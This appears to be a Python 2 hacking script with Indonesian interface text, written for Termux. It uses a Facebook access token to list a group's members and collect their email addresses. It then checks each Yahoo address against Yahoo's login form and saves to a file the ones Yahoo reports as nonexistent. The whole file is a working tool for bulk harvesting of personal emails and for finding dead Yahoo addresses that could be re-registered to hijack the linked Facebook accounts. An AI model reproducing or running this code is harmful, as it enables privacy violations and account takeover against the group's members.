# -*- coding: utf-8 -*-
import sys
from login import logo
sys.path.insert (0, "..")
from warna import *


logo()
toket = open ("Token.txt", "r").read ()
id = raw_input (u +"›"+ k +" Id Grup  "+ n +": ")
try:
	nama = json.loads (get ("https://graph.facebook.com/group/?id="+ id +"&access_token="+ toket).text)
	print h +"✔ Email Anggota Grup "+ nama["name"]
	jl = json.loads (get ("https://graph.facebook.com/"+ id +"/members?fields=name,id&limit=999999999&access_token="+ toket).text)
	o = open ("/data/data/com.termux/files/home/storage/shared/Yahoo.txt", "a")
	for i in jl["data"]:
		jll = json.loads (get ("https://graph.facebook.com/"+ i["id"] +"?access_token="+ toket).text)
		try:
			yahoo = re.compile (r'@.*')
			yahooo = yahoo.search (jll["email"]).group ()
			if "yahoo.com" in yahooo:
				br = Browser()
				br.set_handle_robots(False)
				br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
				br.addheaders = [("User-Agent", "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16")]
				br.open ("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = jll["email"]
				klik = br.submit().read()
				rc = re.compile (r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					rcc = rc.search (klik).group ()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in rcc:
					o.write (jll["email"] +" => "+ i["name"] +"\n")
					berhasil.append (jll["email"])
		except KeyError:
			gagal.append (i["id"])
		sys.stdout.write (b +"\rEmail"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
		sys.stdout.flush ()
	o.close ()
	hapus()
	print h +"\r✔ Menyimpan File Di Memori Internal"
	print h +"  Dengan Nama "+ n +": "+ b + tebal +"Yahoo.txt"+ n
	enter()
except KeyError:
	print m + tebal +"✘ Id Grup Tidak Ditemukan"+ n
	sleep (3)